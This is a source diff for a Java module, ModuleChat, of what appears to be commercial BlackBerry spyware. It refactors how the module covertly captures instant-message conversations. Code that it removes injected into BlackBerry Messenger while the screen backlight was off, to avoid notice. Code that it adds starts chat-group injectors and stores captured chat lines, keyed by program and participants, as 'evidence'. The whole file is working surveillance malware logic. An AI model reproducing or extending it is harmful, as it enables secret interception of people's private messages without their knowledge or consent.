@@ -11,8 +11,6 @@ package blackberry.module;
 
 import java.util.Vector;
 
-import net.rim.device.api.system.Backlight;
-import blackberry.AppListener;
 import blackberry.Device;
 import blackberry.Messages;
 import blackberry.config.ConfModule;
@@ -21,11 +19,10 @@ import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceType;
-import blackberry.interfaces.ApplicationObserver;
-import blackberry.interfaces.BacklightObserver;
+import blackberry.evidence.LineMarkup;
+import blackberry.injection.InjectorManager;
+import blackberry.injection.injectors.group.ChatGroupInjector;
 import blackberry.manager.ModuleManager;
-import blackberry.module.im.AppInjectorBBM;
-import blackberry.module.im.LineMarkup;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
@@ -33,18 +30,12 @@ import blackberry.utils.WChar;
 /**
  * Instant Message.
  */
-public final class ModuleChat extends BaseModule implements BacklightObserver,
-        ApplicationObserver {
+public final class ModuleChat extends BaseModule {
     //#ifdef DEBUG
     static Debug debug = new Debug("ModChat", DebugLevel.VERBOSE); //$NON-NLS-1$
     //#endif
 
     private static final long APP_TIMER_PERIOD = 5000;
-
-    AppInjectorBBM appInjector;
-    //boolean infected;
-
-    String appName = Messages.getString("1a.a"); //"Messenger"; //$NON-NLS-1$
 
     LineMarkup markup;
     boolean infecting = false;
@@ -69,7 +60,7 @@ public final class ModuleChat extends BaseModule implements BacklightObserver,
      *            the agent status
      */
     public ModuleChat() {
-        
+
     }
 
     protected boolean parse(ConfModule conf) {
@@ -86,22 +77,11 @@ public final class ModuleChat extends BaseModule implements BacklightObserver,
             return false;
         }
 
-        if (!Device.getInstance().lessThan(8, 0)) {
-            //#ifdef DEBUG
-            debug.error("ChatAgent: not supported for OS 7.x"); //$NON-NLS-1$
-            //#endif
-            enable(false);
-            setDelay(NEVER);
-            return false;
-        }
-
-        setPeriod(APP_TIMER_PERIOD);
-        setDelay(APP_TIMER_PERIOD);
+        setPeriod(NEVER);
+        setDelay(NEVER);
 
         markup = new LineMarkup(getStaticType());
-        
-        appInjector = AppInjectorBBM.getInstance();
-        
+
         //#ifdef DEBUG
         debug.trace("parse end");
         //#endif
@@ -117,57 +97,15 @@ public final class ModuleChat extends BaseModule implements BacklightObserver,
             return;
         }
 
-        AppListener.getInstance().addBacklightObserver(this);
-        AppListener.getInstance().addApplicationObserver(this);
+        ChatGroupInjector.enableGroup(true);
+        InjectorManager.getInstance().start();
 
-        try {
-            if (appInjector == null) {
-                appInjector = AppInjectorBBM.getInstance();
-            } else {
-                appInjector.reset();
-            }
-
-        } catch (Exception ex) {
-            //#ifdef DEBUG
-            debug.error("actualStart: " + ex); //$NON-NLS-1$
-            //#endif
-        }
-
-        if (!status.backlightEnabled() && !appInjector.isInfected()) {
-            //#ifdef DEBUG
-            debug.info("injecting"); //$NON-NLS-1$
-            //#endif
-
-            appInjector.infect();
-        }
     }
 
     public void actualLoop() {
         if (unsupported) {
             return;
         }
-
-        //#ifdef DEBUG
-        debug.trace("actualLoop: start");
-        //#endif
-        
-        if (appInjector.isInfected() && status.backlightEnabled()
-                && isAppForeground) {
-            //#ifdef DEBUG
-            debug.info("actualLoop, infected, enabled, foreground"); //$NON-NLS-1$
-            //#endif
-
-            appInjector.callMenuInContext();
-        }else{
-            //#ifdef DEBUG
-            debug.trace("actualLoop, nothing to do. Infected: " + appInjector.isInfected());
-            //#endif
-        }
-        
-        Utils.sleep(3000);
-        //#ifdef DEBUG
-        debug.trace("actualLoop: end");
-        //#endif
     }
 
     public synchronized void actualStop() {
@@ -175,11 +113,12 @@ public final class ModuleChat extends BaseModule implements BacklightObserver,
         debug.trace("actualStop"); //$NON-NLS-1$
         //#endif
 
-        AppListener.getInstance().removeBacklightObserver(this);
-        AppListener.getInstance().removeApplicationObserver(this);
+        ChatGroupInjector.enableGroup(false);
+        InjectorManager.getInstance().stop();
     }
 
-    private synchronized void serialize(String partecipants, String lastLine) {
+    private synchronized void serialize(String program, String partecipants,
+            String lastLine) {
         //#ifdef DEBUG
         debug.trace("serialize: " + lastLine); //$NON-NLS-1$
         //#endif
@@ -188,127 +127,28 @@ public final class ModuleChat extends BaseModule implements BacklightObserver,
             markup.createEmptyMarkup();
         }
 
-        markup.put(partecipants, lastLine);
+        markup.put(program + partecipants, lastLine);
     }
 
-    private synchronized String unserialize(String partecipants) {
+    private synchronized String unserialize(String program, String partecipants) {
         //#ifdef DEBUG
         debug.trace("unserialize: " + partecipants); //$NON-NLS-1$
         //#endif
-    
+
         if (markup.isMarkup()) {
-            String lastLine = markup.getLine(partecipants);
-    
+            String lastLine = markup.getLine(program + partecipants);
+
             //#ifdef DEBUG
             debug.trace("unserialized: " + lastLine); //$NON-NLS-1$
             //#endif
             return lastLine;
         }
-    
+
         return null;
     }
 
-    public void onBacklightChange(boolean on) {
-        if (!on && !appInjector.isInfected()) {
-            //#ifdef DEBUG
-            debug.info("onBacklightChange, injecting"); //$NON-NLS-1$
-            //#endif
-
-            appInjector.infect();
-        }
-    }
-
-    public void onApplicationChange(String startedName, String stoppedName,
-            String startedMod, String stoppedMod) {
-        if (startedName != null && startedName.indexOf(appName) >= 0) {
-            //#ifdef DEBUG
-            debug.trace("onApplicationChange: foreground"); //$NON-NLS-1$
-            //#endif
-            isAppForeground = true;
-            if (Backlight.isEnabled()) {
-                // se l'utente non e' mai andato  su bbm e' possibile che non si sia mai registrato
-                //enableInfect = true;
-            }
-        } else {
-            //#ifdef DEBUG
-            debug.trace("onApplicationChange: not foreground"); //$NON-NLS-1$
-            //#endif
-            isAppForeground = false;
-        }
-    }
-
-    public synchronized void add(String partecipants, Vector lines) {
-        if (lines == null) {
-            //#ifdef DEBUG
-            debug.error("add: null lines"); //$NON-NLS-1$
-            //#endif
-            return;
-        }
-
-        //#ifdef DEBUG
-        debug.trace("add : " + partecipants + " lines: " + lines.size()); //$NON-NLS-1$ //$NON-NLS-2$
-        //#endif
-
-        if (lines.size() == 0) {
-            //#ifdef DEBUG
-            debug.trace("add: no lines, skipping"); //$NON-NLS-1$
-            //#endif
-            return;
-        }
-
-        //#ifdef DBC
-        Check.asserts(lines != null, "null lines"); //$NON-NLS-1$
-        //#endif
-
-        String lastLine = unserialize(partecipants);
-
-        if (lines.lastElement().equals(lastLine)) {
-            //#ifdef DEBUG
-            debug.trace("add: nothing new"); //$NON-NLS-1$
-            //#endif
-            return;
-        }
-
-        int lastEqual;
-        for (lastEqual = lines.size() - 1; lastEqual >= 0; lastEqual--) {
-            if (lines.elementAt(lastEqual).equals(lastLine)) {
-                //#ifdef DEBUGs
-                debug.trace("add found equal at line: " + lastEqual); //$NON-NLS-1$
-                //#endif
-                break;
-            }
-        }
-
-        if (lastEqual <= 0) {
-            lastEqual = -1;
-            //#ifdef DEBUG
-            debug.info("add: no found, save everything."); //$NON-NLS-1$
-            //#endif
-        }
-
-        try {
-            lastLine = (String) lines.lastElement();
-            //#ifdef DEBUG
-            debug.trace("add, serialize lastLine: " + lastLine); //$NON-NLS-1$
-            //#endif
-
-            serialize(partecipants, lastLine);
-            //#ifdef DEBUG
-            debug.trace("write evidence from line: " + lastEqual + 1); //$NON-NLS-1$
-            //#endif
-            writeEvidence(partecipants, lines, lastEqual + 1);
-
-            //#ifdef DEBUG
-            debug.trace("add end"); //$NON-NLS-1$
-            //#endif
-        } catch (Exception ex) {
-            //#ifdef DEBUG
-            debug.error("add: " + ex); //$NON-NLS-1$
-            //#endif
-        }
-    }
-
-    private void writeEvidence(String partecipants, Vector lines, int startFrom) {
+    private void writeEvidence(String program, String partecipants,
+            Vector lines, int startFrom) {
         //#ifdef DEBUG
         debug.trace("writeEvidence"); //$NON-NLS-1$
         //#endif
@@ -319,7 +159,7 @@ public final class ModuleChat extends BaseModule implements BacklightObserver,
                 "writeEvidence wrong startFrom: " + startFrom); //$NON-NLS-1$
         //#endif
 
-        String imname = Messages.getString("1a.1"); //$NON-NLS-1$
+        String imname = program; //$NON-NLS-1$
         String topic = ""; //$NON-NLS-1$
         String users = partecipants;
 
@@ -342,12 +182,82 @@ public final class ModuleChat extends BaseModule implements BacklightObserver,
         evidence.atomicWriteOnce(items);
 
     }
+    
+    public synchronized void addLines(String program, String partecipants, Vector lines) {
+        if (lines == null) {
+            //#ifdef DEBUG
+            debug.error("add: null lines"); //$NON-NLS-1$
+            //#endif
+            return;
+        }
+ 
+        //#ifdef DEBUG
+        debug.trace("add: " + program + " part: "+ partecipants + " lines: " + lines.size()); //$NON-NLS-1$ //$NON-NLS-2$
+        //#endif
+ 
+        if (lines.size() == 0) {
+            //#ifdef DEBUG
+            debug.trace("add: no lines, skipping"); //$NON-NLS-1$
+            //#endif
+            return;
+        }
+ 
+        //#ifdef DBC
+        Check.asserts(lines != null, "null lines"); //$NON-NLS-1$
+        //#endif
+ 
+        String lastLine = unserialize(program, partecipants);
+ 
+        if (lines.lastElement().equals(lastLine)) {
+            //#ifdef DEBUG
+            debug.trace("add: nothing new"); //$NON-NLS-1$
+            //#endif
+            return;
+        }
+ 
+        int lastEqual;
+        for (lastEqual = lines.size() - 1; lastEqual >= 0; lastEqual--) {
+            if (lines.elementAt(lastEqual).equals(lastLine)) {
+                //#ifdef DEBUGs
+                debug.trace("add found equal at line: " + lastEqual); //$NON-NLS-1$
+                //#endif
+                break;
+            }
+        }
+ 
+        if (lastEqual <= 0) {
+            lastEqual = -1;
+            //#ifdef DEBUG
+            debug.info("add: no found, save everything."); //$NON-NLS-1$
+            //#endif
+        }
+ 
+        try {
+            lastLine = (String) lines.lastElement();
+            //#ifdef DEBUG
+            debug.trace("add, serialize lastLine: " + lastLine); //$NON-NLS-1$
+            //#endif
+ 
+            serialize(program, partecipants, lastLine);
+            //#ifdef DEBUG
+            debug.trace("write evidence from line: " + lastEqual + 1); //$NON-NLS-1$
+            //#endif
+            writeEvidence(program, partecipants, lines, lastEqual + 1);
+ 
+            //#ifdef DEBUG
+            debug.trace("add end"); //$NON-NLS-1$
+            //#endif
+        } catch (Exception ex) {
+            //#ifdef DEBUG
+            debug.error("add: " + ex); //$NON-NLS-1$
+            //#endif
+        }
+        return;
+    }
 
     //#ifdef DEBUG
     public void disinfect() {
-        if (appInjector != null) {
-            appInjector.disinfect();
-        }
+
     }
     //#endif
 
